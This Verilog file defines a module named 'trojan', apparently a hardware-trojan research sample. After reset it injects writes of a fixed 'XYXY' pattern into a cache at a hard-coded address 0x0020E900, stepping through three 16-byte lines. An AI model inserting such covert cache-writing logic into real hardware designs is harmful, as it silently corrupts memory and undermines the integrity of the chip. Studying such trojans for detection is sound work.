
`include "global_defines.v"

`define TROJ_CACHE_BASE_ADDR 32'h0020E900

module trojan (
    input wire i_clk,
    input wire i_rst,

    input wire	      i_cache_stall,

	// Write to cache
	output reg			o_troj,
	output reg [127:0] 	o_troj_write_data,
	output reg [31:0]	o_troj_write_addr,
	output reg [31:0]   o_troj_write_addr_nxt
    );

	reg [15:0]	cache_state;
	reg [15:0]	cache_state_nxt;
	
	wire [127:0] 	troj_data1;
	wire [127:0]	troj_data2;
	wire [127:0] 	troj_data3;
	
	reg		o_troj_nxt;
	reg [31:0]	write_data_nxt;

	reg 		stall_reg;
	
	assign troj_data1 = 128'h58595859585958595859585958595859;		/// "XYXY..."
	assign troj_data2 = 128'h58595859585958595859585958595859;
	assign troj_data3 = 128'h00595859585958595859585958595859;		
	
	always @(posedge i_clk) begin
		if (i_rst) begin
			o_troj 			<= 1'b1;
			cache_state 		<= 16'b0;
			o_troj_write_data 	<= troj_data1;
			o_troj_write_addr	<= `TROJ_CACHE_BASE_ADDR;
			stall_reg		<= 1'b0;
		end
		else if (!i_cache_stall) begin
			if (!stall_reg) begin
				o_troj			<= o_troj_nxt;
				cache_state		<= cache_state_nxt;
				o_troj_write_data	<= write_data_nxt;
				o_troj_write_addr	<= o_troj_write_addr_nxt;
			end else begin
				o_troj			<= o_troj;
				cache_state		<= cache_state;
				o_troj_write_data	<= o_troj_write_data;
				o_troj_write_addr	<= o_troj_write_addr;
				stall_reg		<= 1'b0;
			end
		end
		else begin
			o_troj			<= 1'b0;
			cache_state		<= cache_state;
			o_troj_write_data	<= o_troj_write_data;
			o_troj_write_addr	<= o_troj_write_addr;
			stall_reg 		<= 1'b1;
		end
	end
	
	always @(*) begin
		if (cache_state < 3) begin
			cache_state_nxt = cache_state + 1;
			o_troj_nxt = 1;
		end else begin
			cache_state_nxt = cache_state;
			o_troj_nxt = 0;
		end
		
		if (o_troj_write_data == troj_data1)
			write_data_nxt = troj_data2;
		else if (o_troj_write_data == troj_data2)
			write_data_nxt = troj_data3;
		else
			write_data_nxt = troj_data1;
			
		o_troj_write_addr_nxt = o_troj_write_addr + 8'h10;
	end
    
endmodule

